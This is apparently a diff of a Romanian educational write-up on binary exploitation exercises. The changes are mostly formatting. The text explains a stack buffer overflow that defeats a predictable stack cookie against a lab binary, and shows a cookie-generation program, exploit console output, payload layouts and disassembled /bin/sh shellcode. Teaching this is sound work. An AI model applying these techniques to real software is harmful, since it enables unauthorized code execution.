@@ -16,10 +16,11 @@ sidebar_position: 2
 În urma unei analize statice, se poate observa faptul că programul, odată rulat, va aștepta conexiuni pe `0.0.0.0`, pe un port dat ca argument. Atunci când un client se conectează, se va aștepta un text, lungimea maximă fiind mai mare decât lungimea *buffer*-ului alocat pe stivă. Astfel, o tehnică de exploatare poate fi *buffer overflow*.
 
 Pe stiva funcției `serve_new_member`, se salvează următoarele variabile:
+
 - *Buffer*-ul textului utilizatorului; și
 - O protecție a stivei, numită *stack cookie*, ce este o valoare calculata prin formula:
 
-```
+```c
 srand(time(0));
 cookie = rand() % time(0);
 ```
@@ -28,7 +29,7 @@ cookie = rand() % time(0);
 
 Astfel, structura stivei la apelarea funcției `serve_new_member` este următoarea:
 
-```
+```text
 +-------------------------------------------+
 | buffer                         | 28 bytes |
 +-------------------------------------------+
@@ -42,9 +43,9 @@ Astfel, structura stivei la apelarea funcției `serve_new_member` este următoar
 +-------------------------------------------+
 ```
 
-Tot prin analiză statică, putem vedea că funcția `send_flag` are același prototip ca `send_fail`, putând să ne folosim de adresa ei pentru a suprascrie *pointer*-ul salvat pe stivă. Structura payload-ului va fi astfel:
+Tot prin analiză statică, putem vedea că funcția `send_flag` are același prototip ca `send_fail`, putând să ne folosim de adresa ei pentru a suprascrie *pointer*-ul salvat pe stivă. Structura *payload*-ului va fi astfel:
 
-```
+```text
 +---------------------+----------------------------------+---------------------------------+
 |                     |                                  |                                 |
 | 28 bytes of garbage | 4 bytes of computed stack cookie | 4 bytes of pointer to send_flag |
@@ -61,18 +62,18 @@ Program următor va fi numit `generate_cookie.c` și este scris în C. El se va 
 
 int main(){
 
-	int random_value, cookie, now;
+    int random_value, cookie, now;
 
-	now = time(0);
-	srand(now);
-	random_value = rand();
-	cookie = random_value % now;
-	printf("%d", cookie);
+    now = time(0);
+    srand(now);
+    random_value = rand();
+    cookie = random_value % now;
+    printf("%d", cookie);
 
 }
 ```
 
-In script-ul de mai jos, s-a folosit Python 3 (împreună cu modulul `pwntools`) și programul de mai sus, compilat cu comanda `gcc -o generate_cookie.elf generate_cookie.c`
+In *script*-ul de mai jos, s-a folosit Python 3 (împreună cu modulul `pwntools`) și programul de mai sus, compilat cu comanda `gcc -o generate_cookie.elf generate_cookie.c`
 
 ```python
 #!/usr/bin/env python3
@@ -137,8 +138,8 @@ if __name__ == "__main__":
 
 Odată rulat, următoarele sunt afișate în consolă:
 
-```
-./exploit.py
+```bash
+$ ./exploit.py
 [*] Adresa functiei send_flag este 0x80492af.
 [+] Starting local process '../../Exerciții/cookie_lover/cookie_lover.elf': pid 15554
 [+] Starting local process './generate_cookie.elf': pid 15556
@@ -156,7 +157,7 @@ Odată rulat, următoarele sunt afișate în consolă:
 
 Funcționalitatea codului în limbaj de asamblare din fișierul dat este următoarea:
 
-```
+```asm
 BITS 32
     push 0x0a2173   ; Plasează pe stivă a șirului de caractere "\n!s".
     push 0x776f6c6c ; Plasează pe stivă a șirului de caractere "woll".
@@ -180,8 +181,8 @@ Odată asamblat, codul obiect este folosit pentru popularea celor două fișiere
 
 Pentru fișierul `execution_from_stack.c`, este relevantă opțiunea cu care este compilat programul, și anume `-z execstack`. Acesta face ca stiva să fie executabilă (conform cu rezultatul din `gdb`, prezentat mai jos) și ca acel apel către codul salvat în variabila `shellcode` să fie efectuat corect. Este de menționat aici faptul că permisiunile de scriere și execuție nu se găsesc împreună pe sistemele moderne, datorită Data Execution Prevention (abreviat DEP), însă aici marcăm explicit stiva ca fiind executabilă în scop pur didactic, pentru a demonstra execuția *shellcode*-ului.
 
-```
-gdb ./execution_from_stack.elf
+```bash
+$ gdb ./execution_from_stack.elf
 [...]
 gdb-peda$ break main
 [...]
@@ -189,13 +190,13 @@ gdb-peda$ run
 [...]
 gdb-peda$ vmmap
 [...]
-0xfffdc000 0xffffe000 rwxp	[stack]
+0xfffdc000 0xffffe000 rwxp  [stack]
 ```
 
 Pe de altă parte, fișierul `execution_with_mprotect.c` folosește un mecanism diferit. Se mapează în memorie codul mașină (apelurile `mmap` și `memcpy`), iar zona alocată este marcată ca având toate permisiunile (apel către `mprotect`, cu parametrul `PROT_READ | PROT_WRITE | PROT_EXEC`). Acest lucru permite execuția codului în ciuda DEP.
 
-```
-strace ./execution_with_mprotect.elf
+```bash
+$ strace ./execution_with_mprotect.elf
 [...]
 mmap2(NULL, 1, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0xf7f76000
 mprotect(0xf7f76000, 1, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
@@ -207,7 +208,7 @@ Analizând într-un dezasamblor (eventual și decompilator), deducem faptul că 
 
 Putem genera un fișier cu o lungime care să o depășească pe cea a *buffer*-ului (1100 de caractere sunt suficiente) din interpretorul în linie de comandă a Python 3.
 
-```
+```python
 from pwnlib.util.cyclic import *
 generator = cyclic_gen()
 garbage_payload = generator.get(1100)
@@ -218,28 +219,28 @@ Dând numele fișierul generat (`payload.bin`) ca argument executabilului, obser
 
 Vizitând *website*-ul menționat în enunț, putem alege un *shellcode* care să lanseze un *shell* (de exemplu, [acesta](http://shell-storm.org/shellcode/files/shellcode-841.php)). Copiind șirul de octeți ce îl reprezintă într-un fișier numit `shellcode.bin`, putem folosi comanda `objdump -b binary -m i386 -D shellcode.bin` pentru a-l dezasambla.
 
-```
+```text
 shellcode.bin:     file format binary
 
 Disassembly of section .data:
 
 00000000 <.data>:
-   0:	31 c9                	xor    ecx,ecx
-   2:	f7 e1                	mul    ecx
-   4:	b0 0b                	mov    al,0xb
-   6:	51                   	push   ecx
-   7:	68 2f 2f 73 68       	push   0x68732f2f
-   c:	68 2f 62 69 6e       	push   0x6e69622f
-  11:	89 e3                	mov    ebx,esp
-  13:	cd 80                	int    0x80
-  15:	0a                   	.byte 0xa
+   0:   31 c9                   xor    ecx,ecx
+   2:   f7 e1                   mul    ecx
+   4:   b0 0b                   mov    al,0xb
+   6:   51                      push   ecx
+   7:   68 2f 2f 73 68          push   0x68732f2f
+   c:   68 2f 62 69 6e          push   0x6e69622f
+  11:   89 e3                   mov    ebx,esp
+  13:   cd 80                   int    0x80
+  15:   0a                      .byte 0xa
 ```
 
-Payload-ul final se va folosi și de simbolul menționat, `helper`. Acesta execută instrucțiunea `call %esp`, ceea ce mută fluxul programului pe stivă, octeții executați fiind cei imediat de sub adresa de retur.
+*Payload*-ul final se va folosi și de simbolul menționat, `helper`. Acesta execută instrucțiunea `call %esp`, ceea ce mută fluxul programului pe stivă, octeții executați fiind cei imediat de sub adresa de retur.
 
-Structura payload-ului este următoarea:
+Structura *payload*-ului este următoarea:
 
-```
+```text
 +-----------------------+-------------------------------+-----------+
 |                       |                               |           |
 | 1052 bytes of garbage | 4 bytes for address of helper | shellcode |
